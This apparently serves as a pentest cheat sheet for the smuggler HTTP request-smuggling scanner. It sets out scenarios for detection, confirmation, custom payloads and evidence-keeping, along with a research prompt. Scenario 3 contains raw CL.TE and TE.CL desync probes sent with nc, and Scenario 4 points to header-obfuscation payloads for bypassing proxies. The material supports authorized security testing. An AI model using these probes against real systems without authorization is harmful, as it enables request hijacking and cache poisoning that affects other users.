# smuggler — command scenarios for deep research

Installed build: packaged `smuggler.py`. Flags come from `help.txt`.

## How to invoke

```text
@deep-research For smuggler.py in 2026, which CL.TE/TE.CL/TE.TE payloads still
detect desync behind modern CDNs and reverse proxies, how should timing results
be confirmed reproducibly, and what safety controls prevent cache poisoning
during testing? Cite the smuggler repo, PortSwigger desync research, and CDN
behaviour; return a confirmation workflow and a stop condition.
```

---

## Scenario 1 — basic detection

| # | Command | How to use |
|---|---------|------------|
| 1 | `smuggler -u https://target/` | Full payload set |
| 2 | `smuggler -u https://target/ -q` | Findings only |
| 3 | `smuggler -u https://target/ -x -q` | Exit on first finding |
| 4 | `smuggler -u https://target/ -l smuggle.log` | Log everything |
| 5 | `smuggler -u https://target/ --no-color -q` | Log-safe |

**Research questions**
- Which payload families does the default config include?
- How does the tool classify `ok`, `potential`, and `issue`?

**Sources:** config file, source, output.
**Output:** a candidate list for manual confirmation.

---

## Scenario 2 — endpoints, vhosts, methods

| # | Command | How to use |
|---|---------|------------|
| 6 | `smuggler -u https://target/login -q` | Specific endpoint |
| 7 | `smuggler -u https://target/api -v api.internal.example.com -q` | Vhost |
| 8 | `smuggler -u https://target/ -m GET -q` | GET method |
| 9 | `smuggler -u https://target/ -m POST -q` | POST method |
| 10 | `smuggler -u https://target/ -t 15 -q` | Longer timeout |

**Research questions**
- Which endpoints are most likely to be desync-capable?
- Does the Host header or vhost change backend routing?

**Sources:** target architecture, proxy logs.
**Output:** endpoint-specific findings.

---

## Scenario 3 — confirmation

| # | Command | How to use |
|---|---------|------------|
| 11 | `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' \| nc target 80` | Raw CL.TE probe |
| 12 | `printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\n...' \| nc target 80` | TE.CL probe |
| 13 | `curl -v --http1.1 https://target/ -d 'x'` | Baseline request |
| 14 | `smuggler -u https://target/ -q -l retest.log` | Repeat run |
| 15 | `diff <(grep issue run1.log) <(grep issue retest.log)` | Compare runs |

**Research questions**
- Which confirmation technique is safest (timing, differential, cache)?
- How do you prove impact without affecting other users?

**Sources:** PortSwigger labs, raw socket output, proxy history.
**Output:** a reproducible PoC.

---

## Scenario 4 — custom payloads and edge stacks

| # | Command | How to use |
|---|---------|------------|
| 16 | `smuggler -u https://target/ -c custom.conf -q` | Custom config |
| 17 | `cat custom.conf \| head` | Review payloads first |
| 18 | `smuggler -u https://target/ -c custom.conf -x` | Stop on first hit |
| 19 | `smuggler -u https://target/ -c te-te.conf -q` | TE.TE variants |
| 20 | `smuggler -u https://target/ -c obfuscated.conf -q` | Header obfuscation |

**Research questions**
- Which header obfuscations bypass each proxy?
- How should custom payloads be version-controlled?

**Sources:** proxy docs, research papers, config diff.
**Output:** stack-specific payload coverage.

---

## Scenario 5 — safety and evidence

| # | Command | How to use |
|---|---------|------------|
| 21 | `date; smuggler ...; date` | Record test window |
| 22 | `smuggler -u https://target/ -q -l evidence.log` | Evidence log |
| 23 | `sha256sum evidence.log` | Hash |
| 24 | `curl -s https://target/health` | Verify target health after |
| 25 | `grep -c issue evidence.log` | Count findings |

**Research questions**
- What stop condition protects shared caches?
- Which logs prove the test window and target health?

**Sources:** engagement RoE, health checks, logs.
**Output:** a safe test record and health verification.

## Flag coverage checklist

| Flag | Scenario |
|------|----------|
| `-u` | 1–5 |
| `-v` | 2 |
| `-x` | 1, 4 |
| `-m` | 2 |
| `-l -q --no-color` | 1, 5 |
| `-t` | 2 |
| `-c` | 4 |

## Scenario index

| Scenario | Commands |
|----------|----------|
| 1 — detection | 5 |
| 2 — endpoints | 5 |
| 3 — confirmation | 5 |
| 4 — custom payloads | 5 |
| 5 — safety | 5 |
